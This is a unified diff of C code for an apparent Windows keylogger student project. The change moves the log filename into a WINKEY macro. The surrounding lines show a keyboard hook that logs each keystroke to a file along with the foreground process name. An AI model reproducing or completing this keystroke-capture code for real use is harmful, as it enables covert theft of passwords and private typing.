@@ -9,7 +9,7 @@
 
 // un jour je ferais le .h insha'Allah
 
-const char *winkey = "winkey.log";
+//const char *winkey = "winkey.log";
 DWORD lastPid = 0;
 
 void	AffProcessName(DWORD processID, const char *path)
@@ -63,7 +63,7 @@ int    forground_process(void)
 	}
 
 	GetWindowThreadProcessId(hwnd, &pid);
-	AffProcessName(pid, winkey);
+	AffProcessName(pid, WINKEY);
 
 	/*printf("hwnd: %p\n", (void*)hwnd);
 	printf("pid: %lu\n", (unsigned long)pid);*/
@@ -152,15 +152,15 @@ LRESULT CALLBACK foo(int ncode, WPARAM wparam, LPARAM lparam)
         DWORD pid = 0;
         GetWindowThreadProcessId(hwnd, &pid);
 		if (pid != lastPid) {
-			FILE *file = fopen(winkey, "a");
+			FILE *file = fopen(WINKEY, "a");
 			if (file) {
 				fprintf(file, "\n");
 				fclose(file);
 			}
-			AffProcessName(pid, winkey);
+			AffProcessName(pid, WINKEY);
 			lastPid = pid;
 		}
-		write_key(winkey, vkCode);
+		write_key(WINKEY, vkCode);
 	}
     return (CallNextHookEx(NULL, ncode, wparam, lparam));
 }
@@ -198,10 +198,10 @@ int main(void)
     }
 
     printf("Hook ok: %p\n", (void*)hook);
-	create_file(winkey);
+	create_file(WINKEY);
     while (GetMessage(&msg, NULL, 0, 0))
     {
-		write_in_file(winkey, msg);
+		write_in_file(WINKEY, msg);
         //forground_process();
         TranslateMessage(&msg); // jsp ca fais quoi sah
     }
